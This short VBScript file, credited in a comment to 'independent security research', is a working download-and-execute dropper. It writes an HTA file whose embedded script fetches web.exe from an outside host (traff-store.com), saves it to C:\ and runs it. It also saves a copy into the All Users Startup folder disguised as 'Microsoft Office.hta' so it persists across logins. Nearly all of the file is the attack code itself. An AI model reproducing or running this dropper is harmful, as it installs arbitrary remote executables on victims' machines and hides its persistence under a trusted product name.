on error resume next
' indepedent security research by www.MichaelEvanchik.com
set evanchik = CreateObject("ADODB.Recordset")
   With evanchik
       .Fields.Append "evanchik", 200, "3000"
       Call .Open
       Call .AddNew
       .Fields("evanchik").Value = "meaning less shit i had to put here"
       Call .AddNew
       .Fields("evanchik").Value = "<script language=vbscript> : window.moveTo 2000, 2000 : on error resume next : set o = CreateObject(""msxml2.XMLHTTP"") : o.open ""GET"",""http://traff-store.com/gallery10066/l2/loader2/web.exe"",False : o.send : set s = createobject(""adodb.stream"") : s.type=1 : s.open : s.write o.responseBody : s.savetofile ""C:\6ecb2699.exe"",2 : Set ws = CreateObject(""WScript.Shell"") : ws.Run ""C:\6ecb2699.exe"", 3, FALSE : </script>"      
       Call .Update
   End With
evanchik.Save "C:\d25c119d.hta", adPersistXML
evanchik.Save "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Microsoft Office.hta", adPersistXML
evanchik.Close